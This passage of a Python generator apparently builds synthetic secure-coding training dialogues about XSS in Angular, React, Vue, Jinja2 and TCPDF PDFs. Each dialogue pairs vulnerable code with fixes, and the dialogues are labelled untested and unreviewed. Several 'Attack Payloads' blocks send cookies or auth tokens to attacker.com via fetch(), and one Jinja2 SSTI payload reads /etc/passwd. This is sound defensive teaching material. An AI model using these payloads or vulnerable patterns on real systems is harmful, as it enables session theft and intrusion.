3. **Separate Domain**: JSONP on api.example.com, app on app.example.com
4. **Rate Limiting**: Prevent abuse
5. **Data Sanitization**: Ensure no executable code in data
6. **No Sensitive Data**: Never return secrets via JSONP
7. **Restrictive CSP**: Even on JSONP domain
8. **Migration Plan**: Deprecate JSONP, move clients to CORS

This reduces risk but JSONP is inherently dangerous. The best solution is removing it entirely."""

    return {
        "id": "xss-000040",
        "metadata": create_base_metadata("javascript", 40, "csp_bypass_jsonp"),
        "context": CSP_BYPASS_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_006_angular_template_injection_typescript():
    '''TypeScript/Angular - Angular Template Injection XSS'''

    user_turn_1 = "I'm building an Angular application that displays user profiles with custom HTML content. How do I safely render user-provided HTML?"

    assistant_turn_1 = """I'll show you why unsafe Angular binding leads to template injection XSS, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```typescript
import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-user-profile',
  template: `
    <div class="profile">
      <h1>{{ username }}</h1>
      <!-- DANGER: Using bypassSecurityTrustHtml without sanitization -->
      <div [innerHTML]="userBio"></div>

      <!-- DANGER: Direct interpolation in attribute -->
      <div class="status" [attr.data-status]="userStatus"></div>
    </div>
  `
})
export class VulnerableProfileComponent implements OnInit {
  username: string = '';
  userBio: SafeHtml | undefined;
  userStatus: string = '';

  constructor(
    private route: ActivatedRoute,
    private sanitizer: DomSanitizer
  ) {}

  ngOnInit() {
    // Get user data from API
    const userId = this.route.snapshot.params['id'];
    this.loadUserProfile(userId);
  }

  async loadUserProfile(userId: string) {
    const response = await fetch(`/api/users/${userId}`);
    const user = await response.json();

    this.username = user.username;

    // DANGER: bypassSecurityTrustHtml disables Angular's built-in XSS protection
    this.userBio = this.sanitizer.bypassSecurityTrustHtml(user.bio);

    this.userStatus = user.status;
  }
}
```

**Why This Is Dangerous:**

Angular's `bypassSecurityTrustHtml` disables XSS protection, allowing malicious HTML to execute:

**Attack Payloads:**

```html
<!-- 1. Basic XSS via user bio -->
<img src=x onerror="alert(document.domain)">

<!-- 2. Event handler injection -->
<div onmouseover="fetch('https://attacker.com/steal?cookie='+document.cookie)">
  Hover over my profile!
</div>

<!-- 3. Angular expression injection (older Angular versions) -->
{{constructor.constructor('alert(1)')()}}

<!-- 4. Script injection -->
<script>
  // Steal authentication token
  const token = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: token })
  });
</script>

<!-- 5. SVG-based XSS -->
<svg/onload="alert(document.domain)">

<!-- 6. Attribute-based XSS -->
<a href="javascript:alert(1)">Click me</a>
```

When ANY user views the attacker's profile, the malicious code executes in their browser context.

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```typescript
import { Component, OnInit, SecurityContext } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import DOMPurify from 'isomorphic-dompurify';

interface UserProfile {
  id: number;
  username: string;
  bio: string;
  status: string;
  bioFormat: 'text' | 'html';
}

@Component({
  selector: 'app-user-profile',
  template: `
    <div class="profile">
      <h1>{{ username }}</h1>

      <!-- Safe: Using sanitized HTML -->
      <div [innerHTML]="sanitizedBio"></div>

      <!-- Safe: Text interpolation only -->
      <div class="status">Status: {{ userStatus }}</div>
    </div>
  `,
  styleUrls: ['./user-profile.component.css']
})
export class SecureProfileComponent implements OnInit {
  username: string = '';
  sanitizedBio: SafeHtml | string = '';
  userStatus: string = '';

  constructor(
    private route: ActivatedRoute,
    private sanitizer: DomSanitizer
  ) {}

  ngOnInit() {
    const userId = this.route.snapshot.params['id'];
    this.loadUserProfile(userId);
  }

  async loadUserProfile(userId: string) {
    // Validate user ID
    if (!this.isValidUserId(userId)) {
      console.error('Invalid user ID');
      return;
    }

    try {
      const response = await fetch(`/api/users/${userId}`, {
        headers: {
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error('Failed to load profile');
      }

      const user: UserProfile = await response.json();

      // Validate response
      if (!this.validateUserProfile(user)) {
        throw new Error('Invalid user profile data');
      }

      // Safe text assignment
      this.username = this.sanitizer.sanitize(SecurityContext.HTML, user.username) || '';
      this.userStatus = this.sanitizer.sanitize(SecurityContext.HTML, user.status) || '';

      // Sanitize bio based on format
      if (user.bioFormat === 'html') {
        this.sanitizedBio = this.sanitizeUserHTML(user.bio);
      } else {
        // Plain text - safest option
        this.sanitizedBio = this.sanitizer.sanitize(SecurityContext.HTML, user.bio) || '';
      }

    } catch (error) {
      console.error('Error loading profile:', error);
      this.username = 'Error loading profile';
    }
  }

  isValidUserId(userId: string): boolean {
    // Validate user ID format
    return /^\\d{1,10}$/.test(userId);
  }

  validateUserProfile(user: any): user is UserProfile {
    // Type and structure validation
    if (typeof user !== 'object' || user === null) {
      return false;
    }

    if (typeof user.id !== 'number') return false;
    if (typeof user.username !== 'string') return false;
    if (typeof user.bio !== 'string') return false;
    if (typeof user.status !== 'string') return false;

    // Length validation
    if (user.username.length > 50) return false;
    if (user.bio.length > 5000) return false;
    if (user.status.length > 200) return false;

    return true;
  }

  sanitizeUserHTML(html: string): SafeHtml {
    /**
     * Sanitize user HTML with strict configuration.
     * Use DOMPurify before Angular's sanitizer for defense in depth.
     */

    // Step 1: DOMPurify sanitization
    const purified = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a'],
      ALLOWED_ATTR: {
        'a': ['href', 'title']
      },
      ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
      KEEP_CONTENT: true,
      RETURN_DOM: false,
      SANITIZE_DOM: true
    });

    // Step 2: Add rel attributes to links
    const processed = this.addLinkSecurity(purified);

    // Step 3: Angular's built-in sanitization
    const angularSanitized = this.sanitizer.sanitize(SecurityContext.HTML, processed);

    // Step 4: Mark as safe only after both sanitizers
    return this.sanitizer.bypassSecurityTrustHtml(angularSanitized || '');
  }

  addLinkSecurity(html: string): string {
    /**
     * Add security attributes to links.
     */
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    doc.querySelectorAll('a').forEach(link => {
      link.setAttribute('rel', 'noopener noreferrer');

      const href = link.getAttribute('href');
      if (href && this.isExternalLink(href)) {
        link.setAttribute('target', '_blank');
      }
    });

    return doc.body.innerHTML;
  }

  isExternalLink(href: string): boolean {
    try {
      const url = new URL(href, window.location.origin);
      return url.origin !== window.location.origin;
    } catch {
      return false;
    }
  }
}
```

**Component with Content Security Policy:**

```typescript
// app.component.ts - Add CSP meta tag
import { Component, OnInit } from '@angular/core';
import { Meta } from '@angular/platform-browser';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html'
})
export class AppComponent implements OnInit {
  constructor(private meta: Meta) {}

  ngOnInit() {
    // Add CSP meta tag
    this.meta.addTag({
      'http-equiv': 'Content-Security-Policy',
      content: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https:; object-src 'none'"
    });
  }
}
```

**Key Security Controls:**

1. **Never Use bypassSecurityTrustHtml Without Sanitization**: Always sanitize first
2. **DOMPurify + Angular Sanitizer**: Double sanitization (defense in depth)
3. **SecurityContext.HTML**: Use Angular's built-in sanitizer
4. **Strict Allowlists**: Minimal HTML tags and attributes
5. **Input Validation**: Type checking and length limits
6. **Link Security**: Automatic rel="noopener noreferrer"
7. **CSP Headers**: Additional protection layer

Attack payloads are blocked by DOMPurify and Angular's sanitizer working together."""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(ANGULAR_TEMPLATE_INJECTION_CONTEXT, indent=2))

    user_turn_3 = "What if I need to support Angular templates with dynamic expressions? How do I prevent template injection?"

    assistant_turn_3 = """Never use user input in Angular templates or expressions. If you need dynamic content, use a safe rendering approach:

```typescript
import { Component, OnInit, ViewContainerRef, ComponentFactoryResolver, Type } from '@angular/core';
import { DomSanitizer, SecurityContext } from '@angular/platform-browser';
import DOMPurify from 'isomorphic-dompurify';

// Predefined safe components for dynamic content
@Component({
  selector: 'app-text-block',
  template: '<p>{{ content }}</p>'
})
export class TextBlockComponent {
  content: string = '';
}

@Component({
  selector: 'app-link-block',
  template: '<a [href]="safeUrl" rel="noopener noreferrer">{{ linkText }}</a>'
})
export class LinkBlockComponent {
  safeUrl: string = '#';
  linkText: string = '';
}

interface DynamicContent {
  type: 'text' | 'link' | 'image';
  data: Record<string, any>;
}

@Component({
  selector: 'app-dynamic-content',
  template: `
    <div class="dynamic-container">
      <ng-container #dynamicContent></ng-container>
    </div>
  `
})
export class DynamicContentComponent implements OnInit {
  constructor(
    private viewContainerRef: ViewContainerRef,
    private componentFactoryResolver: ComponentFactoryResolver,
    private sanitizer: DomSanitizer
  ) {}

  ngOnInit() {
    // Load dynamic content safely
    this.loadDynamicContent();
  }

  async loadDynamicContent() {
    try {
      const response = await fetch('/api/content/dynamic');
      const content: DynamicContent[] = await response.json();

      // Validate content structure
      if (!Array.isArray(content)) {
        throw new Error('Invalid content format');
      }

      // Render each content block safely
      content.forEach(block => this.renderContentBlock(block));

    } catch (error) {
      console.error('Failed to load dynamic content:', error);
    }
  }

  renderContentBlock(block: DynamicContent) {
    /**
     * Safely render dynamic content using predefined components.
     * NEVER evaluate user input as Angular templates.
     */

    // Validate block structure
    if (!this.validateContentBlock(block)) {
      console.error('Invalid content block:', block);
      return;
    }

    switch (block.type) {
      case 'text':
        this.renderTextBlock(block.data);
        break;
      case 'link':
        this.renderLinkBlock(block.data);
        break;
      default:
        console.warn('Unknown content type:', block.type);
    }
  }

  validateContentBlock(block: any): block is DynamicContent {
    if (typeof block !== 'object' || block === null) {
      return false;
    }

    const validTypes = ['text', 'link', 'image'];
    if (!validTypes.includes(block.type)) {
      return false;
    }

    if (typeof block.data !== 'object' || block.data === null) {
      return false;
    }

    return true;
  }

  renderTextBlock(data: Record<string, any>) {
    const factory = this.componentFactoryResolver.resolveComponentFactory(TextBlockComponent);
    const componentRef = this.viewContainerRef.createComponent(factory);

    // Sanitize text content
    const sanitized = this.sanitizer.sanitize(SecurityContext.HTML, data.content || '');
    componentRef.instance.content = sanitized || '';
  }

  renderLinkBlock(data: Record<string, any>) {
    const factory = this.componentFactoryResolver.resolveComponentFactory(LinkBlockComponent);
    const componentRef = this.viewContainerRef.createComponent(factory);

    // Validate and sanitize URL
    const url = this.validateURL(data.url);
    componentRef.instance.safeUrl = url;

    // Sanitize link text
    const linkText = this.sanitizer.sanitize(SecurityContext.HTML, data.text || '');
    componentRef.instance.linkText = linkText || 'Link';
  }

  validateURL(url: string): string {
    /**
     * Validate URL and return safe version.
     */
    try {
      const parsed = new URL(url);

      // Only allow http and https
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        console.warn('Invalid protocol:', parsed.protocol);
        return '#';
      }

      return parsed.href;
    } catch {
      console.error('Invalid URL:', url);
      return '#';
    }
  }
}

// Service for safe template rendering
import { Injectable } from '@angular/core';

@Injectable({
  providedIn: 'root'
})
export class SafeTemplateService {
  constructor(private sanitizer: DomSanitizer) {}

  /**
   * NEVER use this pattern - for educational purposes only.
   * Shows what NOT to do with user input.
   */
  // DANGER: DO NOT DO THIS
  // renderUnsafeTemplate(template: string, data: any) {
  //   // This would allow template injection
  //   return eval(`\`${template}\``); // NEVER DO THIS
  // }

  /**
   * Safe approach: Use predefined templates with sanitized data.
   */
  renderSafeContent(templateType: string, data: Record<string, any>): string {
    // Allowlist of template types
    const templates: Record<string, (data: any) => string> = {
      'user_card': (data) => this.renderUserCard(data),
      'article_preview': (data) => this.renderArticlePreview(data),
      'notification': (data) => this.renderNotification(data)
    };

    if (!templates[templateType]) {
      console.error('Unknown template type:', templateType);
      return '';
    }

    // Sanitize all data before rendering
    const sanitizedData = this.sanitizeData(data);

    // Render with predefined template
    return templates[templateType](sanitizedData);
  }

  sanitizeData(data: Record<string, any>): Record<string, string> {
    /**
     * Sanitize all data values.
     */
    const sanitized: Record<string, string> = {};

    for (const [key, value] of Object.entries(data)) {
      const sanitizedValue = this.sanitizer.sanitize(
        SecurityContext.HTML,
        String(value)
      );
      sanitized[key] = sanitizedValue || '';
    }

    return sanitized;
  }

  renderUserCard(data: Record<string, any>): string {
    // Predefined template with sanitized interpolation
    return `
      <div class="user-card">
        <h3>${data.name}</h3>
        <p>${data.bio}</p>
      </div>
    `;
  }

  renderArticlePreview(data: Record<string, any>): string {
    return `
      <div class="article-preview">
        <h2>${data.title}</h2>
        <p>${data.excerpt}</p>
        <a href="/articles/${data.id}">Read more</a>
      </div>
    `;
  }

  renderNotification(data: Record<string, any>): string {
    return `
      <div class="notification">
        <span class="icon">${data.icon}</span>
        <span class="message">${data.message}</span>
      </div>
    `;
  }
}
```

**Security Principles:**

1. **Never Evaluate User Input as Templates**: No eval(), no Function(), no template strings with user input
2. **Component-Based Rendering**: Use predefined Angular components
3. **Template Allowlist**: Only predefined template types allowed
4. **Sanitize All Data**: Use Angular's sanitizer on all user values
5. **URL Validation**: Protocol allowlist for links
6. **Type Validation**: Strict validation of content structure
7. **No Dynamic Compilation**: Never compile templates at runtime with user input

This prevents template injection by never treating user input as executable code."""

    return {
        "id": "xss-000041",
        "metadata": create_base_metadata("typescript", 41, "angular_template_injection"),
        "context": ANGULAR_TEMPLATE_INJECTION_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_007_react_dangerously_setinnerhtml_typescript():
    '''TypeScript/React - React dangerouslySetInnerHTML XSS'''

    user_turn_1 = "I'm building a React CMS that needs to render user-generated HTML content. How do I safely use dangerouslySetInnerHTML?"

    assistant_turn_1 = """I'll show you why dangerouslySetInnerHTML without sanitization causes stored XSS, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```typescript
import React, { useState, useEffect } from 'react';

interface Article {
  id: number;
  title: string;
  content: string;
  author: string;
}

// DANGER: Using dangerouslySetInnerHTML without sanitization
const VulnerableArticleComponent: React.FC<{ articleId: number }> = ({ articleId }) => {
  const [article, setArticle] = useState<Article | null>(null);

  useEffect(() => {
    fetch(`/api/articles/${articleId}`)
      .then(res => res.json())
      .then(data => setArticle(data));
  }, [articleId]);

  if (!article) return <div>Loading...</div>;

  return (
    <div className="article">
      <h1>{article.title}</h1>
      <div className="author">By: {article.author}</div>
      {/* DANGER: Renders raw HTML from database */}
      <div dangerouslySetInnerHTML={{ __html: article.content }} />
    </div>
  );
};
```

**Attack Payloads:**

```html
<!-- Malicious article content stored in database -->
<p>Great article!</p>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- Event handler injection -->
<div onclick="window.location='https://attacker.com/phish'">Click for more info</div>

<!-- Script injection -->
<script>
const token = localStorage.getItem('auth_token');
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify({ token: token })
});
</script>
```

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```typescript
import React, { useState, useEffect } from 'react';
import DOMPurify from 'dompurify';

interface Article {
  id: number;
  title: string;
  content: string;
  contentType: 'html' | 'markdown' | 'text';
  author: string;
}

interface SanitizedContent {
  __html: string;
}

const SecureArticleComponent: React.FC<{ articleId: number }> = ({ articleId }) => {
  const [article, setArticle] = useState<Article | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    loadArticle(articleId);
  }, [articleId]);

  const loadArticle = async (id: number) => {
    try {
      const response = await fetch(`/api/articles/${id}`);
      if (!response.ok) throw new Error('Failed to load article');

      const data: Article = await response.json();

      // Validate article structure
      if (!validateArticle(data)) {
        throw new Error('Invalid article data');
      }

      setArticle(data);
    } catch (err) {
      setError('Failed to load article');
      console.error(err);
    }
  };

  const validateArticle = (article: any): article is Article => {
    if (!article || typeof article !== 'object') return false;
    if (typeof article.id !== 'number') return false;
    if (typeof article.title !== 'string') return false;
    if (typeof article.content !== 'string') return false;
    if (typeof article.author !== 'string') return false;

    // Length validation
    if (article.title.length > 200) return false;
    if (article.content.length > 100000) return false;

    return true;
  };

  const sanitizeHTML = (html: string): SanitizedContent => {
    const clean = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: [
        'h1', 'h2', 'h3', 'h4', 'p', 'br', 'strong', 'em', 'u',
        'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'a', 'img'
      ],
      ALLOWED_ATTR: {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'title'],
        'code': ['class']
      },
      ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
      KEEP_CONTENT: true
    });

    // Additional link processing
    const processedHTML = addLinkSecurity(clean);

    return { __html: processedHTML };
  };

  const addLinkSecurity = (html: string): string => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    doc.querySelectorAll('a').forEach(link => {
      link.setAttribute('rel', 'noopener noreferrer');
      const href = link.getAttribute('href');
      if (href && href.startsWith('http')) {
        link.setAttribute('target', '_blank');
      }
    });

    return doc.body.innerHTML;
  };

  if (error) return <div className="error">{error}</div>;
  if (!article) return <div>Loading...</div>;

  return (
    <div className="article">
      <h1>{article.title}</h1>
      <div className="metadata">
        <span>By: {article.author}</span>
      </div>
      {article.contentType === 'html' ? (
        <div dangerouslySetInnerHTML={sanitizeHTML(article.content)} />
      ) : (
        <div>{article.content}</div>
      )}
    </div>
  );
};

export default SecureArticleComponent;
```

**Key Security Controls:**

1. **DOMPurify Sanitization**: Remove dangerous HTML before rendering
2. **Strict Tag Allowlist**: Only safe formatting tags
3. **Attribute Allowlist**: Block event handlers
4. **URL Validation**: Only http/https protocols
5. **Link Security**: Add rel="noopener noreferrer"
6. **Input Validation**: Type and length checks
7. **Prefer Text Rendering**: Use text content when possible"""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(REACT_DANGEROUS_INNERHTML_CONTEXT, indent=2))

    user_turn_3 = "Can I use react-markdown instead of dangerouslySetInnerHTML? Is it safer?"

    assistant_turn_3 = """Yes, react-markdown is much safer because it doesn't render arbitrary HTML. Here's the secure approach:

```typescript
import React from 'react';
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import remarkGfm from 'remark-gfm';
import DOMPurify from 'dompurify';

const SafeMarkdownRenderer: React.FC<{ content: string }> = ({ content }) => {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[rehypeSanitize]}
      components={{
        a: ({ node, ...props }) => (
          <a {...props} rel="noopener noreferrer" target="_blank" />
        ),
        img: ({ node, ...props }) => {
          const src = props.src || '';
          if (isValidImageURL(src)) {
            return <img {...props} alt={props.alt || ''} />;
          }
          return null;
        }
      }}
    >
      {content}
    </ReactMarkdown>
  );
};

const isValidImageURL = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' &&
           /\\.(jpg|jpeg|png|gif|webp)$/i.test(parsed.pathname);
  } catch {
    return false;
  }
};

export default SafeMarkdownRenderer;
```

This is much safer than dangerouslySetInnerHTML because react-markdown parses Markdown into React components, not raw HTML."""

    return {
        "id": "xss-000042",
        "metadata": create_base_metadata("typescript", 42, "react_dangerous_setinnerhtml"),
        "context": REACT_DANGEROUS_INNERHTML_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_008_vue_v_html_xss_javascript():
    '''JavaScript/Vue.js - Vue v-html Directive XSS'''

    user_turn_1 = "I'm using Vue.js and need to display rich text from users. How do I safely use the v-html directive?"

    assistant_turn_1 = """I'll show you why v-html without sanitization is dangerous, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```javascript
// DANGER: Using v-html with unsanitized user content
<template>
  <div class="post">
    <h2>{{ post.title }}</h2>
    <!-- DANGER: v-html renders raw HTML -->
    <div v-html="post.content"></div>
  </div>
</template>

<script>
export default {
  name: 'PostDisplay',
  data() {
    return {
      post: {
        title: '',
        content: ''
      }
    };
  },
  async mounted() {
    const response = await fetch(`/api/posts/${this.$route.params.id}`);
    this.post = await response.json();
  }
};
</script>
```

**Attack Payloads:**

```html
<!-- Stored in post.content -->
<img src=x onerror="alert(document.domain)">
<script>fetch('https://attacker.com?c='+document.cookie)</script>
```

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```javascript
<template>
  <div class="post">
    <h2>{{ post.title }}</h2>
    <div v-html="sanitizedContent"></div>
  </div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  name: 'SecurePostDisplay',
  data() {
    return {
      post: { title: '', content: '' }
    };
  },
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.post.content, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
        ALLOWED_ATTR: { 'a': ['href'] }
      });
    }
  },
  async mounted() {
    const response = await fetch(`/api/posts/${this.$route.params.id}`);
    this.post = await response.json();
  }
};
</script>
```

**Key Security Controls:**

1. **DOMPurify**: Sanitize before v-html
2. **Computed Property**: Automatic sanitization
3. **Strict Allowlist**: Minimal tags/attributes"""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(VUE_V_HTML_CONTEXT, indent=2))

    user_turn_3 = "Should I use v-text instead of v-html when possible?"

    assistant_turn_3 = """Yes! Always prefer v-text for plain text. It's much safer:

```javascript
<template>
  <div class="comment">
    <!-- Safe: v-text automatically escapes -->
    <p v-text="comment.text"></p>

    <!-- Also safe: template interpolation -->
    <p>{{ comment.text }}</p>

    <!-- Only use v-html when truly needed AND sanitized -->
    <div v-html="sanitizedHTML"></div>
  </div>
</template>
```

v-text and {{ }} interpolation automatically escape HTML, preventing XSS."""

    return {
        "id": "xss-000043",
        "metadata": create_base_metadata("javascript", 43, "vue_v_html_xss"),
        "context": VUE_V_HTML_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_009_ssti_to_xss_python_jinja2():
    '''Python/Jinja2 - Server-Side Template Injection Leading to XSS'''

    user_turn_1 = "I'm building custom email templates in Flask where users can create their own templates. How do I allow this safely?"

    assistant_turn_1 = """I'll show you why render_template_string with user input causes SSTI and XSS, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/email/preview', methods=['POST'])
def preview_email():
    # DANGER: User controls template content
    template = request.form.get('template')
    data = {'user': 'John', 'product': 'Widget'}

    # DANGER: render_template_string with user input = SSTI
    html = render_template_string(template, **data)
    return html
```

**Attack Payloads:**

```jinja2
<!-- SSTI to XSS -->
{{ ''.__class__.__mro__[1].__subclasses__()[407]('/etc/passwd').read() }}

<!-- Simpler XSS -->
{{ '<script>alert(document.domain)</script>' | safe }}
```

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```python
from flask import Flask, request, render_template, abort
from jinja2 import Environment, select_autoescape, TemplateSyntaxError
from jinja2.sandbox import SandboxedEnvironment
import bleach

app = Flask(__name__)

class SecureTemplateRenderer:
    def __init__(self):
        self.env = SandboxedEnvironment(
            autoescape=select_autoescape(['html', 'xml'])
        )

        # Allowed variables in templates
        self.allowed_vars = ['user', 'product', 'company']

    def render_user_template(self, template_str, data):
        # Validate data keys
        for key in data.keys():
            if key not in self.allowed_vars:
                raise ValueError(f'Unauthorized variable: {key}')

        try:
            template = self.env.from_string(template_str)
            html = template.render(**data)

            # Sanitize output
            return bleach.clean(html, tags=['p', 'br', 'strong', 'em'])
        except TemplateSyntaxError:
            raise ValueError('Invalid template syntax')

renderer = SecureTemplateRenderer()

@app.route('/email/preview', methods=['POST'])
def preview_email_secure():
    template_str = request.form.get('template', '')
    data = {'user': 'John', 'product': 'Widget'}

    try:
        html = renderer.render_user_template(template_str, data)
        return html
    except ValueError as e:
        abort(400, str(e))
```

**Key Security Controls:**

1. **SandboxedEnvironment**: Prevents dangerous operations
2. **Variable Allowlist**: Only specific vars allowed
3. **Autoescape**: Automatic HTML escaping
4. **Output Sanitization**: bleach as final layer"""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(SSTI_XSS_CONTEXT, indent=2))

    user_turn_3 = "Can users still format text if I use a sandbox?"

    assistant_turn_3 = """Yes! Use predefined template components:

```python
SAFE_TEMPLATES = {
    'welcome': 'Hello {{ user }}, welcome!',
    'order': 'Order #{{ order_id }} confirmed',
    'reminder': 'Hi {{ user }}, your {{ product }} is ready'
}

@app.route('/email/render', methods=['POST'])
def render_email():
    template_key = request.form.get('template_type')

    if template_key not in SAFE_TEMPLATES:
        abort(400, 'Invalid template')

    template_str = SAFE_TEMPLATES[template_key]
    data = request.form.to_dict()

    return renderer.render_user_template(template_str, data)
```

This gives formatting options without SSTI risk."""

    return {
        "id": "xss-000044",
        "metadata": create_base_metadata("python", 44, "ssti_to_xss"),
        "context": SSTI_XSS_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_010_pdf_xss_php():
    '''PHP - PDF XSS through PDF Generation Libraries'''

    user_turn_1 = "I'm using TCPDF to generate PDFs with user content. Is there any XSS risk with PDFs?"

    assistant_turn_1 = """Yes! PDFs opened in browsers can execute JavaScript. I'll show the vulnerability and secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```php
<?php
require_once('tcpdf/tcpdf.php');

// DANGER: PDF with user content and JavaScript enabled
$pdf = new TCPDF();
$pdf->SetCreator('MyApp');
$pdf->AddPage();

// User-submitted content
$userContent = $_POST['content'];

// DANGER: Embedding unsanitized user content in PDF
$html = "<h1>Report</h1><div>$userContent</div>";
$pdf->writeHTML($html);

// DANGER: JavaScript enabled in PDF
$pdf->IncludeJS("app.alert('PDF loaded');");

$pdf->Output('report.pdf', 'I');
?>
```

**Attack Payloads:**

```html
<!-- User submits this content -->
<script>app.alert('XSS in PDF')</script>
```

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```php
<?php
require_once('tcpdf/tcpdf.php');

class SecurePDFGenerator {
    private $allowedTags = ['p', 'br', 'strong', 'em', 'h1', 'h2'];

    public function generatePDF($content, $title) {
        // Sanitize content
        $safeContent = $this->sanitizeHTML($content);

        $pdf = new TCPDF();

        // Disable JavaScript completely
        $pdf->SetCreator('MyApp');
        $pdf->SetAuthor('System');
        $pdf->SetTitle($title);

        // Security settings
        $pdf->SetProtection(
            array('print', 'copy'),
            '',
            null,
            0,
            null
        );

        $pdf->AddPage();
        $pdf->writeHTML($safeContent, true, false, true, false, '');

        // Force download with correct headers
        header('Content-Type: application/pdf');
        header('Content-Disposition: attachment; filename="report.pdf"');
        header('X-Content-Type-Options: nosniff');

        $pdf->Output('report.pdf', 'D');
    }

    private function sanitizeHTML($html) {
        // Strip all tags except allowed
        return strip_tags($html, '<p><br><strong><em><h1><h2>');
    }
}

$generator = new SecurePDFGenerator();
$generator->generatePDF($_POST['content'], 'Report');
?>
```

**Key Security Controls:**

1. **Disable PDF JavaScript**: Never use IncludeJS()
2. **Sanitize Content**: Strip dangerous tags
3. **Force Download**: Don't open in browser
4. **Content-Type Headers**: Proper MIME type"""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(PDF_XSS_CONTEXT, indent=2))

    user_turn_3 = "Should I use a different PDF library?"

    assistant_turn_3 = """Consider libraries with better security defaults:

```php
<?php
// Use FPDF or mPDF with security settings
